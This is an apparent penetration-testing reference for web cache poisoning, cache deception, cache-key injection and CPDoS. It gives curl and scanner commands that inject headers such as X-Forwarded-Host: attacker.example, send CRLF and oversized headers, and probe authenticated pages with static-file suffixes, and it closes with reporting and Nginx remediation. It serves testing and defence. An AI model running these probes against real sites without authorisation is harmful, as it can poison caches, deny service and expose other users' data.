# Web Cache Poisoning & Deception — Vulnerability Class Reference

> Complete detection, validation, and exploitation reference for Web Cache Poisoning (WCP), Web Cache Deception (WCD), and Cache-Key Injection.
> Based on the Ultimate Web Cache Vulnerability Detection Field Manual v4.0.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Burp Suite + Param Miner + WCVS + custom scripts for automation.

---

## Root Cause

Web cache vulnerabilities occur when a cache and origin server interpret requests differently, leading to:

1. **WCP**: Unkeyed input influences origin response → cached → served to other users
2. **WCD**: Cache treats dynamic URL as static resource → caches sensitive response → served to unauthorized users
3. **Cache-Key Injection**: Two distinct requests serialize to same cache key → response collision

```nginx
# VULNERABLE: Nginx concatenation without escaping
proxy_cache_key "$scheme$proxy_host$uri$is_args$args";
# Attacker injects underscore: /home_en -> /home_en_en

# VULNERABLE: Custom key concatenation without escaping
KEY = path + "_" + language
# /home_en + en = /home_en_en
# /home + en_en = /home_en_en  <- COLLISION!
```

---

## Variants

| Variant | Type | Description | Detection |
|---------|------|-------------|-----------|
| **WCP: Unkeyed Header** | WCP | Header affects response but not cache key | Header injection + clean retrieval |
| **WCP: Unkeyed Parameter** | WCP | Query param affects response but not key | Parameter injection + clean retrieval |
| **WCP: Fat GET** | WCP | GET with body affects response | Body on GET + cache key ignore |
| **WCP: Method Override** | WCP | X-HTTP-Method-Override affects response | Override header + cache key ignore |
| **WCD: Static Extension** | WCD | Dynamic route + .css/.js suffix cached | Static suffix + auth bypass |
| **WCD: Path Mapping** | WCD | Cache ignores extra path segments | Path traversal + cache static rule |
| **WCD: Delimiter Discrepancy** | WCD | ; ? # %00 handled differently | Delimiter testing |
| **WCD: Normalization** | WCD | Cache/origin normalize differently | Double encoding, case, slashes |
| **Cache-Key Injection** | CKI | Two requests → same cache key | Collision construction + clean retrieval |
| **CPDoS** | CPDoS | Error page cached under benign key | HPO/HMC/HMO patterns |

---

## Testing Checklist (via Caido + Burp + WCVS)

### Phase 1: Recon & Baseline

```bash
# 1. Identify cache layers
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/" | \
  grep -iE 'age:|x-cache:|cf-cache-status:|x-cache-status:|x-varnish:|via:|x-cache-hits:|server-timing:'

# 2. Baseline recording
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/endpoint" > baseline.txt

# 3. Repeat to check cache behavior
for i in {1..3}; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/endpoint" | \
    grep -iE 'age:|x-cache:|cf-cache-status:'
done
```

### Phase 2: Cache Key Reconstruction

```bash
# Test each dimension independently
DIMENSIONS=(
  "Host: attacker.example"
  "X-Forwarded-Host: attacker.example"
  "X-Original-URL: /malicious"
  "X-Rewrite-URL: /malicious"
  "Accept: text/html"
  "Accept-Language: en"
  "X-Forwarded-Proto: http"
  "X-Forwarded-Port: 80"
)

for header in "${DIMENSIONS[@]}"; do
  echo "Testing: $header"
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "$header: CACHE_TEST_$(date +%s)" \
    "https://target.com/" | grep -iE 'age:|x-cache:|cf-cache-status:'
done
```

### Phase 3: Unkeyed Input Discovery (Param Miner + WCVS)

```bash
# Param Miner (Burp extension) - discovers unkeyed headers/params
# WCVS - Web Cache Vulnerability Scanner
docker run --rm -v $(pwd):/data hackmanit/wcvs \
  -t "https://target.com" \
  -p "http://localhost:8080" \
  --unkeyed-headers --unkeyed-params --fat-get --method-override \
  --path-traversal --static-extension --normalized-path \
  -o wcvs_report.json

# Param Miner via Burp:
# 1. Install Param Miner (BApp Store)
# 2. Right-click request → Extensions → Param Miner → Guess headers/params
# 3. Results show unkeyed inputs
```

### Phase 4: WCP Detection Loop

```bash
# For each candidate unkeyed input:
# 1. Baseline request
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/search?q=test" > baseline.txt

# 2. Inject unique marker
MARKER="CACHE_TEST_$(date +%s%N)"
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Forwarded-Host: attacker.example" \
  "https://target.com/search?q=test" > test.txt

# 3. Check if marker reflected in response
grep -i "CACHE_TEST" test.txt

# 4. Check if marker is unkeyed (no new cache entry)
# Send clean request to same key
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/search?q=test" > clean.txt
grep -i "CACHE_TEST" clean.txt  # If found → POISONING CONFIRMED
```

### Phase 5: WCD Detection

```bash
# 1. Authenticated baseline (your test account)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Cookie: session=YOUR_SESSION" \
  "https://target.com/account" > auth_baseline.txt

# 2. Test static extensions
for ext in .css .js .jpg .png .svg .ico .woff .woff2; do
  echo "Testing /account${ext}"
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Cookie: session=YOUR_SESSION" \
    "https://target.com/account${ext}" | \
    grep -iE 'content-type:|x-cache:|cf-cache-status:|age:'
done

# 3. Path mapping discrepancies
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Cookie: session=YOUR_SESSION" \
  "https://target.com/account/nonexistent.css"

# 4. Path delimiters
for path in "/account;.css" "/account%3b.css" "/account%00.css" "/account%3f.css" "/account/../account.css"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Cookie: session=YOUR_SESSION" \
    "https://target.com/account${path}" | \
    grep -iE 'content-type:|x-cache:|cf-cache-status:'
done

# 4. Unauthenticated retrieval
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/account/profile.css" | \
  grep -iE 'content-type:|x-cache:|cf-cache-status:|age:'
```

### Phase 5: Cache-Key Injection

```bash
# Test Nginx underscore collision
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/home_en?lang=en"

curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/home?lang=en_en"

# Query string canonicalization collision
# KEY = sorted params joined by &
# {q: "budget", rows: 10} -> q=budget&rows=10
# {q: "budget&rows=10"} -> q=budget&rows=10

# Test canonicalization collision
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/search?q=budget&rows=10"

curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/search?q=budget%26rows%3d10"
```

### Phase 6: CPDoS Testing

```bash
# HPO - HTTP Header Oversize
# Send request with oversized header to trigger 431
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Large-Header: $(python3 -c 'print("A"*5000)')" \
  "https://target.com/"

# HMC - HTTP Meta Character
# Send request with invalid characters in header
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Test: value\r\ninjected" \
  "https://target.com/"

# HMO - HTTP Method Override
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -X POST -H "X-HTTP-Method-Override: GET" \
  "https://target.com/api/resource"
```

---

## Advanced Detection with WCVS + Param Miner

```bash
# WCVS comprehensive scan
docker run --rm -v $(pwd):/data hackmanit/wcvs \
  -t "https://target.com" \
  -p "http://localhost:8080" \
  --crawl \
  --unkeyed-headers \
  --unkeyed-params \
  --fat-get \
  --method-override \
  --path-traversal \
  --static-extension \
  --normalized-path \
  --cors \
  --param-cloaking \
  --cache-key-injection \
  -o wcvs_report.json

# Param Miner (Burp Suite):
# 1. Install from BApp Store
# 2. Right-click request → Extensions → Param Miner → Guess headers
# 3. Guess parameters
# 4. Check "Unkeyed inputs" tab

# Burp Suite workflow:
# 1. Proxy → HTTP history → filter by target
# 2. Send to Repeater
# 3. Param Miner → Guess headers/params
# 3. Send to Repeater with marker
# 4. Compare responses in Comparer
```

---

## Verification Sequence (Mandatory)

```bash
# For WCP:
# 1. Baseline request
# 2. Modified request with unique marker
# 3. Origin response changed?
# 4. Input absent from cache key?
# 5. Clean request to same key → returns modified content?
# 5. Clean request HIT or rising Age?
# 6. Cross-session validation (different session/unauthenticated)

# For WCD:
# 1. Authenticated baseline (your test account)
# 2. Deceptive URL → origin returns sensitive data?
# 3. Cache stores it (HIT on repeat or clean request)?
# 4. Unauthenticated request to deceptive URL → returns sensitive data?

# For Cache-Key Injection:
# 1. Two distinct raw requests
# 2. Same cache identity (HIT, rising Age, identical body)
# 3. Different origin responses (bypass cache)
# 4. Clean retrieval proves collision
```

---

## Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| WCP → Stored XSS | Unkeyed input reflects in HTML/JS | Critical |
| WCP → Open Redirect | Unkeyed input in Location header | High |
| WCD → Sensitive Data Exposure | Authenticated data cached as static | High |
| WCD → CSRF Token Exposure | Cached page contains CSRF token | Medium |
| Cache-Key Injection → ACL Bypass | Public key collides with privileged | Critical |
| CPDoS | Error cached under benign key | High |
| Cache-Key Injection → Stored XSS | Scheme confusion → stored XSS | Critical |
| WCD → CSRF Token Exposure | Cached page contains token | Medium (if token usable) |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| Reflected header | Not stored/retrieved | Clean retrieval proof |
| Cache HIT | No modification | Marker in clean response |
| Age > 0 | No poisoning | Marker in clean response |
| Wildcard Cache-Control | No poisoning | Clean retrieval with marker |
| Body difference | Different cache keys | Same key proof (HIT, Age) |
| Scanner result | No manual verification | Manual clean retrieval |
| Missing Vary | No cache poisoning | Cross-origin cache reuse |

---

## Reporting

### Title Examples
- `Web Cache Poisoning via Unkeyed X-Forwarded-Host Header`
- `Web Cache Deception Exposes Authenticated Account Information`
- `Cache-Key Injection Allows Cross-Request Response Collision`
- `Web Cache Poisoning Enables Persistent JavaScript Injection`

### Evidence Required
1. Baseline request/response
2. Modified request with marker
3. Response showing marker reflection
4. Clean request to same key → marker in response
4. Cross-session retrieval
5. Sink identification (HTML, Location, JS, etc.)

### Severity
| Level | Criteria |
|-------|----------|
| **Critical** | Stored XSS, request capture, ACL bypass |
| **High** | Sensitive data exposure, open redirect, cache poisoning |
| **Medium** | CSRF token exposure, limited data leak |
| **Low** | Non-sensitive data, restricted impact |

### Remediation

```nginx
# Cache key correction
proxy_cache_key "$scheme$proxy_host$request_uri";

# Strip untrusted headers at edge
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";

# Authenticated responses
proxy_cache_valid 200 0s;  # Don't cache authenticated
proxy_cache_key "$scheme$proxy_host$request_uri$cookie_session";

# Content-Type validation for static
if ($http_content_type !~* "^(text/css|application/javascript|image/)") {
    add_header Cache-Control "no-store";
}
```

---

## Caido Integration

```bash
# All tools via Caido proxy
curl -x "http://localhost:8080" ...
# WCVS via Caido
docker run --rm -v $(pwd):/data hackmanit/wcvs \
  -t "https://target.com" \
  -p "http://localhost:8080" \
  ...
# Burp Suite → configure upstream proxy to http://localhost:8080
```

---

## Tools Integration

| Tool | Caido Integration | Purpose |
|------|-------------------|---------|
| `curl` | `-x "http://localhost:8080"` | Manual testing |
| `wcvs` (Docker) | `-p "http://localhost:8080"` | Automated scanning |
| `Param Miner` (Burp) | Upstream proxy to Caido | Header/param discovery |
| `cacheprobe` | Go package, configure proxy | Programmatic detection |
| `nuclei` | `-proxy "http://localhost:8080"` | Template-based detection |
| `autopoisoner` | Upstream proxy | Additional poisoning automation |

---

## Quick Reference

### Key curl Commands (via Caido)

```bash
# Baseline
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/"

# Unkeyed header test
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Forwarded-Host: attacker.example" "https://target.com/"

# WCD static extension
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Cookie: session=YOURS" "https://target.com/account.css"

# Cache-key injection (Nginx underscore)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/home_en?lang=en"

# Clean retrieval test
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/search?q=test"
```

### Key Header Patterns

```
VULNERABLE:
- Unkeyed header reflected in response + clean retrieval
- WCD: Authenticated data cached as static + unauthenticated retrieval
- CKI: Two requests → same cache key → different origin responses

SAFE:
- Reflected but keyed input
- WCD: Cache Deception Armor active + Content-Type mismatch
- No storage or no cross-session retrieval
```

### Tools

| Tool | Caido Integration | Purpose |
|------|-------------------|---------|
| `curl` | `-x "http://localhost:8080"` | Manual testing |
| `wcvs` (Docker) | `-p "http://localhost:8080"` | Automated scanning |
| `Param Miner` (Burp) | Upstream proxy to Caido | Header/param discovery |
| `cacheprobe` | Go package, configure proxy | Programmatic detection |
| `nuclei` | `-proxy "http://localhost:8080"` | Template detection |
| `autopoisoner` | Upstream proxy | Additional poisoning automation |